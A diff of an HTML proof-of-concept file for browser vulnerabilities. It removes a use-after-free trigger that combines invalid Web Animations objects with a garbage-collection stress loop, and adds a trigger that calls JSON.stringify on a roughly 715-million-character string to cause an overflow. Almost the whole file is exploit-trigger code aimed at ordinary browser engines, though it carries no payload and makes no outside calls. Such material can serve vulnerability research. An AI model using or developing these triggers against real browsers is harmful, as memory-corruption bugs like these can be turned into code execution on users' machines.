@@ -2,54 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Animation UAF PoC v4</title>
+    <title>FastStringifier Overflow PoC</title>
 </head>
 <body>
-    <div id="target"></div>
     <script>
-        function stressGC() {
-            for (let i = 0; i < 1000; i++) {
-                new ArrayBuffer(1024 * 1024);
-            }
-            for (let i = 0; i < 150; i++) {
-                new ArrayBuffer(2 * 1024 * 1024);
-            }
+        try {
+            // Create large string (715,827,883 bytes)
+            const string = "\x00".repeat(715827883);
+            // Trigger overflow in JSON.stringify
+            JSON.stringify(string);
+        } catch (e) {
+            // Silent catch to attempt twice
         }
-
-        // Create animations
-        const target = document.getElementById('target');
-        const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
-        const animations = [];
-        for (let i = 0; i < 100; i++) {
-            const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
-            animations.push(new Animation(effect, document.timeline));
-        }
-        // Add invalid effect 1
         try {
-            const invalidEffect = new KeyframeEffect(target, null, { duration: 0 });
-            animations.push(new Animation(invalidEffect, document.timeline));
+            // Second attempt
+            const string = "\x00".repeat(715827883);
+            JSON.stringify(string);
         } catch (e) {}
-        // Add invalid effect 2
-        try {
-            const invalidEffect2 = new KeyframeEffect(target, keyframes, { duration: NaN });
-            animations.push(new Animation(invalidEffect2, document.timeline));
-        } catch (e) {}
-        // Add invalid timeline
-        try {
-            const invalidTimeline = { currentTime: null };
-            animations.push(new Animation(new KeyframeEffect(target, keyframes, { duration: 1000 }), invalidTimeline));
-        } catch (e) {}
-
-        // Trigger UAF
-        setInterval(() => {
-            animations.forEach(anim => {
-                anim.play();
-                anim.finish();
-                anim.effect.getComputedTiming();
-            });
-            target.replaceChildren('test');
-            stressGC();
-        }, 1);
     </script>
 </body>
 </html>
